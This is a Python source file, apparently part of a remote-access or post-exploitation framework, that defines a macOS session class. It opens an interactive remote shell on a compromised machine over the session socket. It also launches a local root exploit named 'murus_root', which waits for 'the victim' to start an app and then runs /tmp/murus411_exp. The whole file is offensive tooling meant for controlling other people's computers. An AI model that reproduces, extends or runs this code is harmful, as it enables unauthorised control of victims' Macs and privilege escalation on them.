import extra_functions.custom_print as custom_print
from extra_functions.sessions.model import ModelSession
from extra_functions.sessions.mac.data import DATA_CHECK, EXPLOITS


class Mac(ModelSession):
    def __init__(self, s_obj, current_session):     
        self.meterpreter_functions = {
                        "shell": {
                            "function": "shell",
                            "help": "Spawn a Shell",
                            "commmand":"shell", 
                            "exec": True,
                            "param": False},
                        "exploit": {
                            "function": "exploit",
                            "help": "Launch an exploit ",
                            "commmand":"exploit <opt>", 
                            "exec": True,
                            "param": True}
                        
                    }
        super(Mac,self).__init__(self.meterpreter_functions, s_obj, current_session, "macos")
    
    def exploit(self, data):
        try:
            exp = EXPLOITS[data[1]]
        except:
            custom_print.info("No exploit...")
            return
        function = exp["function"]
        getattr(self,  function)([function])
    
    def shell(self, data):
        self.send_msg(data, False)
        data = self.current_session.recv(4096)
        result = data.decode()
        if "No" == result:
            custom_print.info("No shell obtained")
            return
        self.get_shell(result)
    
    def get_shell(self, result):
        print(result, end=" ")
        while True:
            data_input = input()
            self.current_session.send((data_input+"\n").encode())
            if "exit" in data_input:
                return
            recv = self.current_session.recv(1024)
            if recv:
                print(recv.decode(), end=" ")
    
    def murus_root(self, data):
        custom_print.info("Waiting.... The victim must start the app")
        self.send_msg(data, False)
        result = self.recv_msg()
        if result == "ok":
            res = input("The exploit is ready. Launch it?(y/n): ")
            if res.lower() == "y":
                self.obj_session.send_msg(self.current_session, ["shell", "/tmp/murus411_exp"])
                data = self.current_session.recv(4096)
                data = data.decode()
                self.get_shell(data)
            else:
                custom_print.info("Aborted")
        else:
            print(result)
    